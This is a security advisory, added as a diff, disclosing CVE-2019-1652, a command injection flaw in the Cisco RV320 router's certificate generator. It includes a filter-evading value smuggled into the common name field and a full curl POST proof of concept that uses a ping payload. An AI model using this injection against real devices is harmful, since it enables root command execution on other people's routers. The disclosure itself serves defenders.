@@ -1,0 +1,97 @@
+id: 32437
+date: 03/27/2019
+title: Cisco RV320 Command Injection Vulnerability
+author: RedTeam
+cves: CVE-2019-1652
+
+Cisco RV320 Command Injection Vulnerability
+
+Product: Cisco RV320 Dual Gigabit WAN VPN Router, possibly others
+Affected Versions: 1.4.2.15 through 1.4.2.20
+Fixed Versions: none
+Vulnerability Type: Remote Code Execution
+Security Risk: medium
+Vendor URL: https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190123-rv-inject
+Vendor Status: working on patch
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2019-005
+Advisory Status: published
+CVE: CVE-2019-1652
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1652
+
+
+Introduction
+============
+
+"Keep your employees, your business, and yourself productive and
+effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
+choice for any small office or small business looking for performance,
+security, and reliability in its network."
+(from the Cisco RV320 product page [1])
+
+
+More Details
+============
+
+The router's web interface enables users to generate new X.509
+certificates directly on the device. Previously, RedTeam Pentesting
+identified a vulnerability (rt-sa-2018-004) [2] in this component. By
+providing a specially crafted common name, it was possible to inject
+shell commands which were subsequently executed on the router as the
+root user. This vulnerability was adressed in firmware version 1.4.2.19
+published by Cisco [3].
+
+RedTeam Pentesting discovered that the certificate generator in the patched
+firmware is still vulnerable. The update adds several filters to handle
+single quotes in user input. However, these filters can be evaded by
+specially crafted inputs. By providing the following string for the
+certificate's common name, a "ping" command can be injected:
+
+------------------------------------------------------------------------
+'a$(ping -c 4 192.168.1.2)'b
+------------------------------------------------------------------------
+
+
+Proof of Concept
+================
+
+The following HTTP POST request invokes the certificate generator
+function and triggers the command injection. It requires a valid session
+cookie for the device's web interface. The user agent "curl" is
+blacklisted by the firmware and must be adjusted in the HTTP client.
+
+------------------------------------------------------------------------
+$ curl -s -k -A kurl -X POST -b "$COOKIE" \
+--data "page=self_generator.htm&totalRules=1&OpenVPNRules=30"\
+"&submitStatus=1&log_ch=1&type=4&Country=A&state=A&locality=A"\
+"&organization=A&organization_unit=A&email=ab%40example.com"\
+"&KeySize=512&KeyLength=1024&valid_days=30&SelectSubject_c=1&"\
+"SelectSubject_s=1" \
+--data-urlencode "common_name='a\$(ping -c 4 192.168.1.2)'b" \
+"https://192.168.1.1/certificate_handle2.htm?type=4"
+------------------------------------------------------------------------
+
+Afterwards, the incoming ICMP echo requests can be observed on the
+attacker's system at 192.168.1.2.
+
+
+Workaround
+==========
+
+Prevent untrusted users from using the router's web interface.
+
+
+Fix
+===
+
+None
+
+
+Security Risk
+=============
+
+The vulnerability allows attackers with administrative access to the
+router's web interface to execute arbitrary operating system commands on
+the device. Because attackers require valid credentials to the web
+interface, this vulnerability is only rated as a medium risk.
+
+#  0day.today [2023-03-26]  #
